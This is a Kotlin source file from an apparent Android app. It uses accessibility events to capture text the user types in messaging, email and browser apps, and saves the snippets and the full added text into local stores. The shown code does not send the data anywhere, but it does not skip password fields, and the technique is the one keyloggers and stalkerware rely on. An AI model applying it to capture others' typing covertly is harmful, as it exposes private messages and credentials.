package com.phonehand.app

import android.content.Context
import android.view.accessibility.AccessibilityEvent

/** Log typed text snippets per app into ActivityStore. */
object TypingTracker {
    private val APP_LABELS = mapOf(
        "com.whatsapp" to "WhatsApp",
        "org.telegram.messenger" to "Telegram",
        "com.google.android.apps.messaging" to "Messages",
        "com.facebook.orca" to "Messenger",
        "com.android.chrome" to "Chrome",
        "com.google.android.gm" to "Gmail",
        "com.instagram.android" to "Instagram",
    )

    fun onTextChanged(context: Context, event: AccessibilityEvent, fallbackPkg: String) {
        val after = event.text?.joinToString("").orEmpty()
        if (after.isEmpty()) return
        val before = event.beforeText?.toString().orEmpty()
        val added = when {
            after.length > before.length && after.startsWith(before) ->
                after.substring(before.length)
            event.addedCount > 0 ->
                after.takeLast(event.addedCount.coerceAtMost(after.length))
            before.isEmpty() && after.isNotEmpty() -> after
            else -> return
        }
        if (added.isBlank() || added.length > 120) return
        val pkg = event.packageName?.toString()?.ifBlank { null } ?: fallbackPkg
        val app = labelFor(pkg)
        val snippet = added.trim().take(80)
        ActivityStore.add(
            context,
            type = "typing",
            app = app,
            who = "",
            preview = snippet,
        )
        NotesStore.append(context, added, "keyboard", pkg)
    }

    private fun labelFor(pkg: String): String {
        APP_LABELS[pkg]?.let { return it }
        return pkg.substringAfterLast('.').replaceFirstChar { c ->
            if (c.isLowerCase()) c.titlecase() else c.toString()
        }.ifBlank { "App" }
    }
}
